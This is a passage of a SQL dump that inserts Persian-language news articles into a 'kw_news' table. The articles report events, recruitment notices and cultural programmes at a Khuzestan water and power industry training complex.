	&nbsp;در این نشست حاضران با ارائه گزارشاتی از میزان تحقق برنامه تقویم در سال جاری به عارضه&zwnj;یابی و بیان چالش&zwnj;های مسیر پیش روی اجرای دوره&zwnj;های آموزشی ضمن خدمت پرداختندو همچنین میزان پیشرفت تدوین تقویم آموزشی سال ١۴٠۴ نیز از جمله مباحثی بود که در این جلسه مورد بحث و تبادل نظر قرار گرفت.<br />
	<br />
	&nbsp;بررسی میزان عملکرد شرکت&zwnj;ها بر اساس دوره و نفرماه توسط اسماعیل عرب زاده، معاون برنامه ریزی آموزشی مجتمع عالی آموزشی صنعت آب و برق خوزستان صورت گرفت.<br />
	<br />
	&nbsp;رئیس مجتمع عالی آموزش و پژوهش صنعت آب و برق خوزستان و رئیس گروه آموزش سازمان آب و برق استان نیز به صورت مجزا توضیحاتی را در خصوص مقدمات، دستورالعمل&zwnj;ها، الزامات و ضوابط تقویم آموزشی ارائه کردند.</p>
<p>
	<br />
	در این نشست میزان دوره&zwnj;های اجرا شده طی ٨ ماهه اخیر و دوره&zwnj;های باقی مانده تا پایان سال تشریح و برنامه&zwnj; ریزی&zwnj;های لازم جهت جذب بودجه جهت اجرای برنامه&zwnj;های باقی&zwnj;مانده انجام شد و در پایان نیز مدیران و رؤسای آموزش شرکت&zwnj;ها به طرح سوالات، مسائل و چالش&zwnj;های موجود پرداختند و مدیران حاضر پاسخگوی سوالات و دغدغه&zwnj;های آنان شدند.<br />
	<br />
	&nbsp;</p>
', '60249AMOO.jpg', 214, '1403/9/9', '3:44:36 PM', 1403, 'آذر', 9, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60250, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری جلسه شورای فرهنگی مجتمع صنعت آب و برق خوزستان با محوریت گزارش عملکرد و برنامه‌ریزی فرهنگی', '<p>
	&nbsp;در جلسه&zwnj;ای که به منظور ارائه گزارش عملکرد امور فرهنگی در آبان ماه برگزار شد، شورای فرهنگی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به بررسی تمامی مصوبات مربوط به این ماه پرداخت. این جلسه با حضور ریاست محترم و اعضای شورای فرهنگی برگزار گردید و در آن برنامه&zwnj;های فرهنگی آذر ماه نیز مورد بحث و بررسی قرار گرفت.</p>', '<p>
	&nbsp;در جلسه&zwnj;ای که به منظور ارائه گزارش عملکرد امور فرهنگی در آبان ماه برگزار شد، شورای فرهنگی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به بررسی تمامی مصوبات مربوط به این ماه پرداخت. این جلسه با حضور ریاست محترم و اعضای شورای فرهنگی برگزار گردید و در آن برنامه&zwnj;های فرهنگی آذر ماه نیز مورد بحث و بررسی قرار گرفت.<br />
	<br />
	در این جلسه، تقویم فرهنگی آذر ماه به تصویب رسید و تصمیمات مهمی در خصوص راه&zwnj;اندازی هیئت اندیشه&zwnj;ورز دانشجویی اتخاذ شد. این هیئت با هدف ارتقاء سطح تفکر و خلاقیت دانشجویان و ایجاد فضایی برای تبادل نظر و ایده&zwnj;ها تشکیل خواهد شد.<br />
	<br />
	&nbsp;همچنین، برنامه&zwnj;های فرهنگی ویژه&zwnj;ای برای کارکنان و دانشجویان در نظر گرفته شده است که انتظار می&zwnj;رود با استقبال خوبی مواجه شود. این برنامه&zwnj;ها به منظور تقویت روحیه همکاری و همبستگی در میان اعضای مجتمع طراحی شده&zwnj;اند.<br />
	<br />
	&nbsp;این اقدامات نشان&zwnj;دهنده عزم جدی مسئولان امور فرهنگی در راستای ارتقاء سطح فعالیت&zwnj;های فرهنگی و اجتماعی در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان است و امید می&zwnj;رود که با اجرای این برنامه&zwnj;ها، فضای فرهنگی مجتمع بیش از پیش رونق یابد.<br />
	&nbsp;</p>', '60250farhangi.jpg', 186, '1403/9/15', '9:43:26 PM', 1403, 'آذر', 9, '15');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60252, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'آیین بزرگداشت روز دانشجو و جشن  دانشجویان جدید الورود ۱۴۰۳ برگزار شد', '<p>
	به گزارش روابط عمومی مجتمع ، آیین بزرگداشت روز دانشجو و جشن دانشجویان جدید الورود ۱۴۰۳ با حضور کیانوش بهرهی، سرپرست دانشگاه علمی کاربردی استان خوزستان و مهدی هودگر، رییس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد.</p>
', '<p>
	&nbsp;به گزارش روابط عمومی مجتمع ، آیین بزرگداشت روز دانشجو و جشن دانشجویان جدید الورود ۱۴۰۳ با حضور کیانوش بهرهی، سرپرست دانشگاه علمی کاربردی استان خوزستان و مهدی هودگر، رییس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد.<br />
	<br />
	&nbsp;در ابتدای این برنامه، دکتر هودگر با تبریک روز دانشجو به تمامی دانشجویان، به ویژه دانشجویان جدید الورود، خیر مقدم گفت و اهمیت این روز را در تاریخ دانشگاه&zwnj;ها و نقش دانشجویان در پیشرفت جامعه یادآوری کرد.<br />
	&nbsp;سپس، رییس دانشگاه علمی کاربردی استان خوزستان به ارائه آمارهایی از عملکرد دانشگاه پرداخت و خدمات دانشجویی ارائه شده در سال&zwnj;های اخیر را تشریح کرد. او همچنین بر لزوم توجه به نیازهای دانشجویان و ارتقای کیفیت آموزشی تاکید کرد.<br />
	&nbsp;در این مراسم، کلیپی با مضمون خاطرات دانشجویی پخش شد که با استقبال گرم دانشجویان روبرو شد. همچنین، یک استندآپ کمدی اجرا شد که لحظات شاد و مفرحی را برای حاضران به ارمغان آورد. در ادامه، منشور اخلاقی دانشجویان قرائت شد که بر اهمیت رفتار اخلاقی و حرفه&zwnj;ای در محیط دانشگاه تاکید داشت.<br />
	در پایان برنامه، جوایز نقدی به شش نفر از برندگان مسابقه کتابخوانی اهدا شد که این اقدام، انگیزه&zwnj;ای برای ترویج فرهنگ مطالعه در بین دانشجویان بود. این آیین با شور و نشاط خاصی برگزار شد و امید می&zwnj;رود که دانشجویان جدید الورود در مسیر تحصیل و پژوهش موفق باشند.</p>
', '60252DANSHJOO.jpg', 169, '1403/9/25', '11:25:07 PM', 1403, 'آذر', 9, '25');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60253, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'با حضور رئیس سازمان فنی و حرفه‌ای کشور: مرکز کارآموزی جوار کارگاهی و بین کارگاهی صنعت آب و برق خوزستان افتتاح شد', '<p>
	مرکز کارآموزی جوار کارگاهی و بین کارگاهی صنعت آب و برق خوزستان با حضور غلامحسین محمدی، معاون وزیر تعاون کار و رفاه اجتماعی و رئیس سازمان فنی و حرفه&zwnj;ای کشور، مهدی هودگر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و برخی مسئولان سازمان در محل مجتمع آموزشی صنعت آب و برق افتتاح شد.</p>', '<p>
	مرکز کارآموزی جوار کارگاهی و بین کارگاهی صنعت آب و برق خوزستان با حضور غلامحسین محمدی، معاون وزیر تعاون کار و رفاه اجتماعی و رئیس سازمان فنی و حرفه&zwnj;ای کشور، مهدی هودگر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و برخی مسئولان سازمان در محل مجتمع آموزشی صنعت آب و برق افتتاح شد.<br />
	<br />
	&nbsp;این مرکز با هدف شناسایی بازارهای مهارت آموزی، طرح&zwnj;ریزی آموزش&zwnj;های مهارتی سفارش محور و انطباق با نیازهای استان و دستیابی به مدل&zwnj;های توانمندسازی شاغلان و کارجویان بازگشایی شد. از جمله اهداف دیگر ایجاد این مرکز می&zwnj;توان به کاهش قیمت تمام شده محصول خدمات با ایجاد جوارهای کارگاهی و بین کارگاهی، بازارسازی آموزش&zwnj;های مهارتی و ... اشاره کرد.<br />
	<br />
	به گفته اسماعیل عرب زاده، معاون برنامه ریزی آموزشی مجتمع عالی آموزشی صنعت آب و برق خوزستان، افتتاح مرکز کارآموزی جوار کارگاهی و بین کارگاهی صنعت آب و برق زمینه&zwnj;ساز کاهش حوادث حین کار، افزایش عمر تجهیزات، افزایش سودآوری بنگاه&zwnj;های اقتصادی و فنی خواهد شد.<br />
	<br />
	&nbsp;از جمله مزایای این مرکز نیز می&zwnj;توان به ارتقاء مهارت اپراتور تولید، مدیران، آموزش اخلاق حرفه&zwnj;ای و آموزش&zwnj;های حین&zwnj;کار، تربیت بازآموزی و تأمین مربی مورد نیاز با استانداردهای فنی و حرفه&zwnj;ای و صنعت اشاره کرد. گفتنی است، شهرام ملایی هزاروندی، مدیر کل آموزش فنی و حرفه&zwnj;ای خوزستان در این آیین رئیس سازمان فنی و حرفه&zwnj;ای کشور را همراهی می&zwnj;کرد.<br />
	<br />
	&nbsp;</p>', '60253VAZIR.jpg', 169, '1403/9/25', '11:28:21 PM', 1403, 'آذر', 9, '25');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60254, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آگهي آزمون بکارگیری نیروی حجمي', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکت های پیمانکار طرف قرارداد شرکت توزیع نیروی برق استان ایلام به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید<span dir="LTR">.</span></p>
', '<p dir="RTL" style="text-align: justify;">
	به اطلاع مي رساند شرکت های پیمانکار طرف قرارداد شرکت توزیع نیروی برق استان ایلام به منظور تأمين نيروي انساني مورد نياز، تعداد 7 نفر (تعداد: 3 نفر به عنوان سيمبان خط &ndash; سرد(بهره برداري)، 3 نفر به عنوان سيمبان مشترکين (قطع و وصل) و 1 نفر مأمور قرائت کنتور) از آقایان واجد شرايط را از طريق برگزاري آزمون و طي فرآيند گزينش و به ترتيب از بالاترين نمره کسب شده با شرايط ذيل در قالب قرارداد نیروی حجمي بکارگيري مي نمايد<strong><span dir="LTR">.</span></strong></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140310/"><strong><span style="font-size:16px;"><span style="color:#800080;">ورود به سامانه ثبت نام</span></span></strong></a></p>
<p dir="RTL" style="text-align: center;">
	<a href="http://kwphc.ir/Azmoon/AzmoonAdv/Adv14031010.pdf"><strong><span style="color:#008000;"><span style="font-size:16px;">دریافت فایلهای ضمیمه</span></span></strong></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_217.jpeg" style="height: 912px; width: 650px;" /></p>
', '60254IlamEstekhdam.jpg', 1038, '1403/9/28', '3:52:59 PM', 1403, 'آذر', 9, '28');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60255, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'حضور فعال غرفه مرکز رشد صنعت آب و برق خوزستان در نمایشگاه فن بازار', '<p>
	غرفه مرکز رشد شهدای صنعت آب و برق خوزستان در نمایشگاه فن بازار استان خوزستان که در محل کتابخانه مرکزی اهواز در حال برگزاری است، با استقبال گسترده&zwnj;ای مواجه شده است. این نمایشگاه فرصتی مناسب برای معرفی نوآوری&zwnj;ها و دستاوردهای فناورانه در حوزه صنعت آب و برق به شمار می&zwnj;رود.</p>', '<p>
	&nbsp;غرفه مرکز رشد شهدای صنعت آب و برق خوزستان در نمایشگاه فن بازار استان خوزستان که در محل کتابخانه مرکزی اهواز در حال برگزاری است، با استقبال گسترده&zwnj;ای مواجه شده است. این نمایشگاه فرصتی مناسب برای معرفی نوآوری&zwnj;ها و دستاوردهای فناورانه در حوزه صنعت آب و برق به شمار می&zwnj;رود.<br />
	در این رویداد مهم، معاون اقتصادی استاندار خوزستان، رئیس بنیاد نخبگان خوزستان و رئیس پژوهش و توسعه منطقه ویژه اقتصادی ماهشهر با حضور در غرفه مرکز رشد شهدای صنعت آب و برق خوزستان، از نزدیک با فعالیت&zwnj;ها و پروژه&zwnj;های این مرکز آشنا شدند.<br />
	&nbsp;حضور مسئولان ارشد استان در این نمایشگاه نشان&zwnj;دهنده اهمیت و توجه ویژه به توسعه فناوری&zwnj;های نوین در صنایع مرتبط با آب و برق است. غرفه مرکز رشد شهدای صنعت آب و برق خوزستان در تلاش است تا با ارائه ایده&zwnj;ها و راهکارهای نوآورانه، نقش موثری در پیشرفت این صنایع ایفا کند.<br />
	<br />
	&nbsp;</p>', '60255fanbazar.jpg', 38, '1403/10/9', '11:15:28 PM', 1403, 'دی', 10, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60256, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری مراسم جشن ولادت حضرت فاطمه زهرا (س) و گرامیداشت روز زن در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان', '<p>
	&nbsp;مراسم جشن ولادت با سعادت حضرت فاطمه زهرا سلام الله علیها و گرامیداشت روز زن با حضور ریاست محترم مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، معاونین مجتمع و بانوان شاغل در این مجتمع، در سالن جلسات برگزار شد.</p>', '<p>
	&nbsp;مراسم جشن ولادت با سعادت حضرت فاطمه زهرا سلام الله علیها و گرامیداشت روز زن با حضور ریاست محترم مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، معاونین مجتمع و بانوان شاغل در این مجتمع، در سالن جلسات برگزار شد.</p>
<p>
	&nbsp;در این مراسم، مهدی هودگر، ریاست مجتمع، ضمن تبریک و گرامیداشت این روز فرخنده، به مقام والای زن در اسلام اشاره کرد و اهمیت نقش زنان در خانواده و جامعه را مورد تأکید قرار داد. وی با بیان ویژگی&zwnj;های بارز حضرت فاطمه زهرا (س)، از ایشان به عنوان الگوی کامل زنان مسلمان یاد کرد.در ادامه، معاونین مجتمع و بانوان حاضر در مراسم نیز هر کدام به نوبه خود این روز را به همکاران خود تبریک گفتند و از زحمات و تلاش&zwnj;های بانوان شاغل در مجتمع قدردانی کردند.</p>
<p>
	<br />
	&nbsp;مراسم با تقدیر و تجلیل از بانوان شاغل در مجتمع به پایان رسید که نشان&zwnj;دهنده احترام و ارادت به مقام زن و تلاش&zwnj;های ارزشمند آنان در پیشبرد اهداف مجتمع بود. این مراسم به عنوان یک رویداد فرهنگی و اجتماعی، فرصت مناسبی برای ایجاد همبستگی و تبادل نظر میان بانوان شاغل در صنعت آب و برق فراهم آورد.<br />
	<br />
	&nbsp;</p>', '60256roozzann.jpg', 126, '1403/10/9', '11:18:16 PM', 1403, 'دی', 10, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60257, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'رویداد ارائه نیازهای فناورانه احصا شده شرکت شهرک های صنعتی خوزستان در نمایشگاه فن بازار خوزستان', '<p>
	در حاشیه برگزاری نمایشگاه فن بازار خوزستان، رویداد مهمی به منظور ارائه نیازهای فناورانه احصا شده از سوی شرکت شهرک&zwnj;های صنعتی خوزستان توسط پارک علم و فناوری خوزستان برگزار گردید. این رویداد فرصتی مناسب برای تبادل نظر و همفکری میان فعالان صنعت و پژوهشگران و ایده پردازان فراهم آورد.</p>', '<p>
	در حاشیه برگزاری نمایشگاه فن بازار خوزستان، رویداد مهمی به منظور ارائه نیازهای فناورانه احصا شده از سوی شرکت شهرک&zwnj;های صنعتی خوزستان توسط پارک علم و فناوری خوزستان برگزار گردید. این رویداد فرصتی مناسب برای تبادل نظر و همفکری میان فعالان صنعت و پژوهشگران و ایده پردازان فراهم آورد.<br />
	&nbsp;در این جلسه، معاون برنامه&zwnj;ریزی آموزشی و معاون مالی و پشتیبانی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان نیز حضور داشتند.این حضور نشان&zwnj;دهنده اهمیت موضوعات فناورانه و نیازهای صنعتی در توسعه و اقتصاد پایدار و همچنین توان بومی و داخلی&nbsp; استان است.<br />
	&nbsp;مکان برگزاری این رویداد، سالن کنفرانس کتابخانه مرکزی اهواز&nbsp;&nbsp; به عنوان یک فضای مناسب برای برگزاری نشست&zwnj;های علمی و تخصصی انتخاب گردید. شرکت&zwnj;کنندگان در این جلسه با ارائه نظرات و پیشنهادات خود، به بررسی چالش&zwnj;ها و فرصت&zwnj;های موجود در حوزه فناوری پرداختند.<br />
	&nbsp;این رویداد نه تنها به شناسایی نیازهای فناورانه کمک&nbsp; خواهد کرد، بلکه زمینه&zwnj;ساز همکاری&zwnj;های بیشتر بین نهادهای علمی و صنعتی در استان خوزستان و اهمیت ارتباط صنعت و دانشگاه خواهد بود.</p>', '60257faanbazarr.jpg', 116, '1403/10/9', '11:21:35 PM', 1403, 'دی', 10, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60258, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'کسب سه عنوان برتر توسط مرکز رشد شهدای صنعت آب و برق خوزستان در شانزدهمین جشنواره جهادگران علم و فناوری خوزستان', '<p>
	شانزدهمین جشنواره جهادگران علم و فناوری استان خوزستان، به میزبانی سازمان منطقه ویژه اقتصادی پتروشیمی، در دی ماه سال جاری برگزار شد. این جشنواره با هدف شناسایی و حمایت از مخترعان و نوآوری&zwnj;های برتر در حوزه&zwnj;های علمی و صنعتی طراحی شده بود و به عنوان یک رویداد مهم در تقویت روحیه نوآوری و خلاقیت در استان شناخته می&zwnj;شود.</p>', '<p>
	شانزدهمین جشنواره جهادگران علم و فناوری استان خوزستان، به میزبانی سازمان منطقه ویژه اقتصادی پتروشیمی، در دی ماه سال جاری برگزار شد. این جشنواره با هدف شناسایی و حمایت از مخترعان و نوآوری&zwnj;های برتر در حوزه&zwnj;های علمی و صنعتی طراحی شده بود و به عنوان یک رویداد مهم در تقویت روحیه نوآوری و خلاقیت در استان شناخته می&zwnj;شود.<br />
	&nbsp;در این رویداد، مرکز رشد شهدای صنعت آب و برق خوزستان موفق به کسب سه عنوان برتر شد که این موفقیت در اولین سال تاسیس این مرکز، نشان از توانمندی و پتانسیل بالای آن دارد. همچنین، این مرکز به عنوان مرکز رشد برتر معرفی و تقدیر گردید که بیانگر کیفیت و اثرگذاری فعالیت&zwnj;های آن در زمینه پرورش ایده&zwnj;ها و حمایت از مخترعان است.<br />
	&nbsp;از دیگر دستاوردهای مهم در این جشنواره، معرفی دو تیم مستقر در مرکز رشد شهدای صنعت آب و برق به عنوان جز ۱۰ اختراع برتر بود .</p>', '60258roooshd.jpg', 419, '1403/10/9', '11:25:21 PM', 1403, 'دی', 10, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60259, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری جلسه مشترک برای بررسی تسهیلات رفاهی کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق', '<p>
	در یک نشست به منظور ارتقا خدمات به سرمایه های انسانی مجتمع ، مهدی هودگر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، به همراه معاون مالی و پشتیبانی مجتمع و مشاور حقوقی ایشان با محمد قصری،رئیس&nbsp; سرپرستی بانک رسالت استان خوزستان دیدار کردند. هدف این جلسه بررسی راهکارها و اخذ تسهیلات رفاهی برای کارکنان مجتمع بود.</p>', '<p>
	در یک نشست به منظور ارتقا خدمات به سرمایه های انسانی مجتمع ، مهدی هودگر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، به همراه معاون مالی و پشتیبانی مجتمع و مشاور حقوقی ایشان با محمد قصری،رئیس&nbsp; سرپرستی بانک رسالت استان خوزستان دیدار کردند. هدف این جلسه بررسی راهکارها و اخذ تسهیلات رفاهی برای کارکنان مجتمع بود.<br />
	&nbsp;در این جلسه، موضوعات متنوعی در خصوص تسهیلات رفاهی مطرح شد و روند فعلی اعطای این تسهیلات مورد بررسی قرار گرفت. کارکنان مجتمع در حال تشکیل پرونده برای دریافت این تسهیلات هستند و برنامه&zwnj;های مربوط به آن در حال توسعه است.<br />
	&nbsp;این اقدام نشان&zwnj;دهنده توجه ویژه به رفاه کارکنان و تلاش برای بهبود شرایط کاری آنهاست. انتظار می&zwnj;رود با همکاری&zwnj;های بیشتر بین بانک رسالت و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق، خدمات بهتری به کارکنان ارائه شود و شرایط رفاهی آنها ارتقاء یابد.<br />
	<br />
	&nbsp;</p>', '60259resalat.jpg', 153, '1403/10/9', '11:26:49 PM', 1403, 'دی', 10, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60260, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'کسب رتبه چهارم استانی در جذب حداکثری دانشجو توسط مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان', '<p dir="RTL" style="text-align: justify;">
	سرپرست دانشگاه جامع علمی کاربردی استان خوزستان با صدور پیامی، از ریاست و کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به خاطر تلاش&zwnj;های ارزشمندشان در جذب حداکثری دانشجویان در مهر سال 1403 قدردانی کرد<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	سرپرست دانشگاه جامع علمی کاربردی استان خوزستان با صدور پیامی، از ریاست و کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به خاطر تلاش&zwnj;های ارزشمندشان در جذب حداکثری دانشجویان در مهر سال 1403 قدردانی کرد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	در این پیام، کیانوش بهری با اشاره به کسب رتبه چهارم این مجتمع در جذب دانشجو در سطح استان، این موفقیت را نتیجه همت و تلاش مستمر ریاست و کارکنان مجتمع دانست و بر اهمیت آموزش&zwnj;های مهارتی و تخصصی در توسعه صنعت آب و برق تاکید کرد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	وی همچنین ابراز امیدواری کرد که با ادامه این روند، مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بتواند به عنوان یک الگوی موفق در جذب دانشجویان و ارتقاء کیفیت آموزش در استان شناخته شود. این تقدیر نشان&zwnj;دهنده توجه ویژه دانشگاه جامع علمی کاربردی به فعالیت&zwnj;های آموزشی و پژوهشی در راستای تحقق اهداف توسعه&zwnj;ای استان خوزستان است<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>
', '60260taghdir.jpg', 77, '1403/10/16', '6:55:03 PM', 1403, 'دی', 10, '16');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60261, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'به مناسبت دهه فجر مرکز رشد شهدای صنعت آب و برق خوزستان برگزار می‌کند', '<p dir="RTL" style="text-align: justify;">
	مرکز رشد شهدای صنعت آب و برق خوزستان با هدف ترویج و گسترش سواد آبی در جامعه، رویداد استارتاپی ویژه&zwnj;ای را تحت عنوان &quot;گسترش سواد آبی&quot; برگزار می&zwnj;کند. این رویداد به دنبال شناسایی و حمایت از ایده&zwnj;های نوآورانه در زمینه استفاده بهینه از منابع آبی است<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	مرکز رشد شهدای صنعت آب و برق خوزستان با هدف ترویج و گسترش سواد آبی در جامعه، رویداد استارتاپی ویژه&zwnj;ای را تحت عنوان &quot;گسترش سواد آبی&quot; برگزار می&zwnj;کند. این رویداد به دنبال شناسایی و حمایت از ایده&zwnj;های نوآورانه در زمینه استفاده بهینه از منابع آبی است<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR"><img alt="🔹" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span> محورهای رویداد</p>
<p dir="RTL" style="text-align: justify;">
	روش های نوین آموزشی در ترویج سواد آبی</p>
<p dir="RTL" style="text-align: justify;">
	فناوری های نوین در ترویج سواد آبی</p>
<p dir="RTL" style="text-align: justify;">
	فرهنگ سازی در استفاده بهتر از آب</p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR"><img alt="🔹" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span> مزایا<span dir="LTR">:</span></p>
<p dir="RTL" style="text-align: justify;">
	اهدای جوایز و لوح تقدیر به ایده های برتر شرکت کننده در رویداد به همراه برگزاری کارگاه های پیش رشد</p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR"><img alt="🔹" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span> مهلت ثبت ایده ۰۱ بهمن ماه 1403 <span dir="LTR"><img alt="🔹" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span>تاریخ برگزاری رویداد ۱۵ بهمن ماه 1403</p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR"><img alt="🔹" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span> لینک ثبت ایده <a href="https://kwphc.ir/startup" target="_blank"><span dir="LTR">https://kwphc.ir/startup</span></a><span dir="LTR"> <img alt="🔹" border="0" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span>لینک برگزاری رویداد <a href="https://elearning.kwphc.ir/" target="_blank"><span dir="LTR">https://elearning.kwphc.ir</span></a></p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR"><img alt="🔹" border="0" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span> مکان برگزاری مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان</p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR"><img alt="🌟" border="0" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" width="64" /></span> شرکت در این رویداد برای تمام عموم آزاد است<span dir="LTR"><img alt="🌟" border="0" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" width="64" /></span><span dir="LTR"> <img alt="🌟" border="0" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" width="64" /></span>برای شرکت در مسابقات و ارائه ایده&zwnj;ها، ثبت&zwnj;نام الزامی است<span dir="LTR"><img alt="🌟" border="0" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" width="64" /></span></p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR"><img alt="🔹" border="0" height="64" src="file:///C:/Users/ADMINI~1.KWP/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" width="64" /></span> اطلاعات تماس برای ثبت ایده و سوالات برای ثبت ایده و اطلاعات بیشتر با شماره تلفن 633343123-061 - 09023569225 تماس بگیرید یا به آدرس <a href="mailto:Reserch@kwphc.ir" target="_blank"><span dir="LTR">Reserch@kwphc.ir</span></a> ایمیل ارسال فرمائید<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '60261savadabi.jpg', 96, '1403/10/16', '7:01:11 PM', 1403, 'دی', 10, '16');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60262, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'بازدید مسئول نهاد رهبری دانشگاه علمی کاربردی خوزستان از مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به منظور راه‌اندازی مرکز آموزش‌های بین‌الملل', '<p dir="RTL" style="text-align: justify;">
	حجت&zwnj;الاسلام و المسلمین محمدعلی سمیع، مسئول نهاد رهبری در دانشگاه علمی کاربردی استان خوزستان به همراه هیأتی از مسئولین، از مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بازدید کردند. این بازدید به منظور بررسی و تبادل نظر در خصوص راه&zwnj;اندازی مرکز آموزش&zwnj;های بین&zwnj;الملل در این مجتمع انجام شد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	حجت&zwnj;الاسلام و المسلمین محمدعلی سمیع، مسئول نهاد رهبری در دانشگاه علمی کاربردی استان خوزستان به همراه هیأتی از مسئولین، از مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بازدید کردند. این بازدید به منظور بررسی و تبادل نظر در خصوص راه&zwnj;اندازی مرکز آموزش&zwnj;های بین&zwnj;الملل در این مجتمع انجام شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
